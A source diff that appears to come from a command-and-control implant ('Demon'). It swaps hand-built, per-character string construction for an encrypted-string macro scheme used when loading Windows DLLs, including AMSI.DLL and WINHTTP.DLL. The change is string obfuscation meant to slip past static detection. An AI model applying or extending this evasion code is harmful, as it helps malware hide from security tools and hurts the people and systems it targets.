@@ -1,6 +1,25 @@
 #include <Demon.h>
 #include <core/Runtime.h>
 #include <core/MiniStd.h>
+#include <core/ObfStrings.h>
+
+#ifdef OBFSTR_DEFINITIONS
+OBFSTR_DEFINE(ADVAPI32, "ADVAPI32.DLL")
+OBFSTR_DEFINE(MSCOREE, "mscoree.dll")
+OBFSTR_DEFINE(OLEAUT32, "OLEAUT32.DLL")
+OBFSTR_DEFINE(USER32, "USER32.DLL")
+OBFSTR_DEFINE(SHELL32, "SHELL32.DLL")
+OBFSTR_DEFINE(MSVCRT, "MSVCRT.DLL")
+OBFSTR_DEFINE(IPHLPAPI, "IPHLPAPI.DLL")
+OBFSTR_DEFINE(GDI32, "GDI32.DLL")
+OBFSTR_DEFINE(NETAPI32, "NETAPI32.DLL")
+OBFSTR_DEFINE(WS2_32, "WS2_32.DLL")
+OBFSTR_DEFINE(SSPICLI, "SSPICLI.DLL")
+OBFSTR_DEFINE(AMSI, "AMSI.DLL")
+OBFSTR_DEFINE(WINHTTP, "WINHTTP.DLL")
+OBFSTR_DEFINE(KERNEL32, "KERNEL32.DLL")
+OBFSTR_DEFINE(NTDLL, "NTDLL.DLL")
+#endif
 
 
 BOOL RtAdvapi32(
@@ -8,19 +27,7 @@ BOOL RtAdvapi32(
 ) {
     CHAR ModuleName[ 13 ] = { 0 };
 
-    ModuleName[ 0  ] = HideChar('A');
-    ModuleName[ 2  ] = HideChar('V');
-    ModuleName[ 11 ] = HideChar('L');
-    ModuleName[ 10 ] = HideChar('L');
-    ModuleName[ 3  ] = HideChar('A');
-    ModuleName[ 8  ] = HideChar('.');
-    ModuleName[ 12 ] = HideChar('\0');
-    ModuleName[ 6  ] = HideChar('3');
-    ModuleName[ 7  ] = HideChar('2');
-    ModuleName[ 1  ] = HideChar('D');
-    ModuleName[ 9  ] = HideChar('D');
-    ModuleName[ 5  ] = HideChar('I');
-    ModuleName[ 4  ] = HideChar('P');
+    OBFSTR_DECRYPT(ADVAPI32, ModuleName);
 
     if ( ( Instance->Modules.Advapi32 = LdrModuleLoad( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
@@ -73,18 +80,7 @@ BOOL RtMscoree(
     if ( Instance->Win32.CLRCreateInstance )
         return TRUE;
 
-    ModuleName[ 1  ] = HideChar('S');
-    ModuleName[ 2  ] = HideChar('C');
-    ModuleName[ 11 ] = HideChar(0);
-    ModuleName[ 0  ] = HideChar('M');
-    ModuleName[ 10 ] = HideChar('L');
-    ModuleName[ 8  ] = HideChar('D');
-    ModuleName[ 7  ] = HideChar('.');
-    ModuleName[ 9  ] = HideChar('L');
-    ModuleName[ 5  ] = HideChar('E');
-    ModuleName[ 4  ] = HideChar('R');
-    ModuleName[ 6  ] = HideChar('E');
-    ModuleName[ 3  ] = HideChar('O');
+    OBFSTR_DECRYPT(MSCOREE, ModuleName);
 
     if ( ( Instance->Modules.Mscoree = LdrModuleLoad( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
@@ -105,19 +101,7 @@ BOOL RtOleaut32(
 ) {
     CHAR ModuleName[ 13 ] = { 0 };
 
-    ModuleName[ 3  ] = HideChar('A');
-    ModuleName[ 2  ] = HideChar('E');
-    ModuleName[ 0  ] = HideChar('O');
-    ModuleName[ 1  ] = HideChar('L');
-    ModuleName[ 5  ] = HideChar('T');
-    ModuleName[ 11 ] = HideChar('L');
-    ModuleName[ 7  ] = HideChar('2');
-    ModuleName[ 6  ] = HideChar('3');
-    ModuleName[ 10 ] = HideChar('L');
-    ModuleName[ 12 ] = HideChar(0);
-    ModuleName[ 4  ] = HideChar('U');
-    ModuleName[ 9  ] = HideChar('D');
-    ModuleName[ 8  ] = HideChar('.');
+    OBFSTR_DECRYPT(OLEAUT32, ModuleName);
 
     if ( ( Instance->Modules.Oleaut32 = LdrModuleLoad( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
@@ -144,17 +128,7 @@ BOOL RtUser32(
 ) {
     CHAR ModuleName[ 11 ] = { 0 };
 
-    ModuleName[ 1  ] = HideChar('S');
-    ModuleName[ 0  ] = HideChar('U');
-    ModuleName[ 10 ] = HideChar(0);
-    ModuleName[ 6  ] = HideChar('.');
-    ModuleName[ 8  ] = HideChar('L');
-    ModuleName[ 7  ] = HideChar('D');
-    ModuleName[ 5  ] = HideChar('2');
-    ModuleName[ 3  ] = HideChar('R');
-    ModuleName[ 9  ] = HideChar('L');
-    ModuleName[ 2  ] = HideChar('E');
-    ModuleName[ 4  ] = HideChar('3');
+    OBFSTR_DECRYPT(USER32, ModuleName);
 
     if ( ( Instance->Modules.User32 = LdrModuleLoad( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
@@ -178,18 +152,7 @@ BOOL RtShell32(
 ) {
     CHAR ModuleName[ 12 ] = { 0 };
 
-    ModuleName[ 0  ] = HideChar('S');
-    ModuleName[ 10 ] = HideChar('L');
-    ModuleName[ 7  ] = HideChar('.');
-    ModuleName[ 6  ] = HideChar('2');
-    ModuleName[ 8  ] = HideChar('D');
-    ModuleName[ 4  ] = HideChar('L');
-    ModuleName[ 1  ] = HideChar('H');
-    ModuleName[ 11 ] = HideChar(0);
-    ModuleName[ 9  ] = HideChar('L');
-    ModuleName[ 5  ] = HideChar('3');
-    ModuleName[ 3  ] = HideChar('L');
-    ModuleName[ 2  ] = HideChar('E');
+    OBFSTR_DECRYPT(SHELL32, ModuleName);
 
     if ( ( Instance->Modules.Shell32 = LdrModuleLoad( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
@@ -210,17 +173,7 @@ BOOL RtMsvcrt(
 ) {
     CHAR ModuleName[ 11 ] = { 0 };
 
-    ModuleName[ 0  ] = HideChar('M');
-    ModuleName[ 6  ] = HideChar('.');
-    ModuleName[ 10 ] = HideChar(0);
-    ModuleName[ 9  ] = HideChar('L');
-    ModuleName[ 4  ] = HideChar('R');
-    ModuleName[ 2  ] = HideChar('V');
-    ModuleName[ 8  ] = HideChar('L');
-    ModuleName[ 7  ] = HideChar('D');
-    ModuleName[ 3  ] = HideChar('C');
-    ModuleName[ 5  ] = HideChar('T');
-    ModuleName[ 1  ] = HideChar('S');
+    OBFSTR_DECRYPT(MSVCRT, ModuleName);
 
     if ( ( Instance->Modules.Msvcrt = LdrModuleLoad( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
@@ -242,19 +195,7 @@ BOOL RtIphlpapi(
 ) {
     CHAR ModuleName[ 13 ] = { 0 };
 
-    ModuleName[ 8  ] = HideChar('.');
-    ModuleName[ 0  ] = HideChar('I');
-    ModuleName[ 10 ] = HideChar('L');
-    ModuleName[ 2  ] = HideChar('H');
-    ModuleName[ 9  ] = HideChar('D');
-    ModuleName[ 6  ] = HideChar('P');
-    ModuleName[ 11 ] = HideChar('L');
-    ModuleName[ 1  ] = HideChar('P');
-    ModuleName[ 3  ] = HideChar('L');
-    ModuleName[ 12 ] = HideChar(0);
-    ModuleName[ 5  ] = HideChar('A');
-    ModuleName[ 4  ] = HideChar('P');
-    ModuleName[ 7  ] = HideChar('I');
+    OBFSTR_DECRYPT(IPHLPAPI, ModuleName);
 
     if ( ( Instance->Modules.Iphlpapi = LdrModuleLoad( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
@@ -275,16 +216,7 @@ BOOL RtGdi32(
 ) {
     CHAR ModuleName[ 10 ] = { 0 };
 
-    ModuleName[ 4 ] = HideChar('2');
-    ModuleName[ 6 ] = HideChar('D');
-    ModuleName[ 5 ] = HideChar('.');
-    ModuleName[ 8 ] = HideChar('L');
-    ModuleName[ 2 ] = HideChar('I');
-    ModuleName[ 1 ] = HideChar('D');
-    ModuleName[ 7 ] = HideChar('L');
-    ModuleName[ 9 ] = HideChar(0);
-    ModuleName[ 0 ] = HideChar('G');
-    ModuleName[ 3 ] = HideChar('3');
+    OBFSTR_DECRYPT(GDI32, ModuleName);
 
     if ( ( Instance->Modules.Gdi32 = LdrModuleLoad( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
@@ -312,19 +244,7 @@ BOOL RtNetApi32(
 ) {
     CHAR ModuleName[ 13 ] = { 0 };
 
-    ModuleName[ 0  ] = HideChar('N');
-    ModuleName[ 11 ] = HideChar('L');
-    ModuleName[ 8  ] = HideChar('.');
-    ModuleName[ 9  ] = HideChar('D');
-    ModuleName[ 6  ] = HideChar('3');
-    ModuleName[ 2  ] = HideChar('T');
-    ModuleName[ 3  ] = HideChar('A');
-    ModuleName[ 10 ] = HideChar('L');
-    ModuleName[ 12 ] = HideChar(0);
-    ModuleName[ 4  ] = HideChar('P');
-    ModuleName[ 5  ] = HideChar('I');
-    ModuleName[ 1  ] = HideChar('E');
-    ModuleName[ 7  ] = HideChar('2');
+    OBFSTR_DECRYPT(NETAPI32, ModuleName);
 
     if ( ( Instance->Modules.NetApi32 = LdrModuleLoad( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
@@ -351,17 +271,7 @@ BOOL RtWs2_32(
 ) {
     CHAR ModuleName[ 11 ] = { 0 };
 
-    ModuleName[ 0  ] = HideChar('W');
-    ModuleName[ 2  ] = HideChar('2');
-    ModuleName[ 4  ] = HideChar('3');
-    ModuleName[ 6  ] = HideChar('.');
-    ModuleName[ 9  ] = HideChar('L');
-    ModuleName[ 1  ] = HideChar('S');
-    ModuleName[ 3  ] = HideChar('_');
-    ModuleName[ 5  ] = HideChar('2');
-    ModuleName[ 10 ] = HideChar(0);
-    ModuleName[ 8  ] = HideChar('L');
-    ModuleName[ 7  ] = HideChar('D');
+    OBFSTR_DECRYPT(WS2_32, ModuleName);
 
     if ( ( Instance->Modules.Ws2_32 = LdrModuleLoad( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
@@ -396,18 +306,7 @@ BOOL RtSspicli(
 ) {
     CHAR ModuleName[ 12 ] = { 0 };
 
-    ModuleName[ 0  ] = HideChar('S');
-    ModuleName[ 11 ] = HideChar(0);
-    ModuleName[ 9  ] = HideChar('L');
-    ModuleName[ 1  ] = HideChar('S');
-    ModuleName[ 6  ] = HideChar('I');
-    ModuleName[ 7  ] = HideChar('.');
-    ModuleName[ 5  ] = HideChar('L');
-    ModuleName[ 8  ] = HideChar('D');
-    ModuleName[ 2  ] = HideChar('P');
-    ModuleName[ 10 ] = HideChar('L');
-    ModuleName[ 4  ] = HideChar('C');
-    ModuleName[ 3  ] = HideChar('I');
+    OBFSTR_DECRYPT(SSPICLI, ModuleName);
 
     if ( ( Instance->Modules.Sspicli = LdrModuleLoad( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
@@ -435,15 +334,7 @@ BOOL RtAmsi(
 ) {
     CHAR ModuleName[ 9 ] = { 0 };
 
-    ModuleName[ 3 ] = HideChar('I');
-    ModuleName[ 5 ] = HideChar('D');
-    ModuleName[ 7 ] = HideChar('L');
-    ModuleName[ 8 ] = HideChar(0);
-    ModuleName[ 6 ] = HideChar('L');
-    ModuleName[ 4 ] = HideChar('.');
-    ModuleName[ 0 ] = HideChar('A');
-    ModuleName[ 1 ] = HideChar('M');
-    ModuleName[ 2 ] = HideChar('S');
+    OBFSTR_DECRYPT(AMSI, ModuleName);
 
     if ( ( Instance->Modules.Amsi = LdrModuleLoad( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
@@ -465,18 +356,7 @@ BOOL RtWinHttp(
 ) {
     CHAR ModuleName[ 12 ] = { 0 };
 
-    ModuleName[ 0  ] = HideChar('W');
-    ModuleName[ 2  ] = HideChar('N');
-    ModuleName[ 7  ] = HideChar('.');
-    ModuleName[ 11 ] = HideChar(0);
-    ModuleName[ 10 ] = HideChar('L');
-    ModuleName[ 4  ] = HideChar('T');
-    ModuleName[ 8  ] = HideChar('D');
-    ModuleName[ 1  ] = HideChar('I');
-    ModuleName[ 9  ] = HideChar('L');
-    ModuleName[ 6  ] = HideChar('P');
-    ModuleName[ 3  ] = HideChar('H');
-    ModuleName[ 5  ] = HideChar('T');
+    OBFSTR_DECRYPT(WINHTTP, ModuleName);
 
     if ( ( Instance->Modules.WinHttp = LdrModuleLoad( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
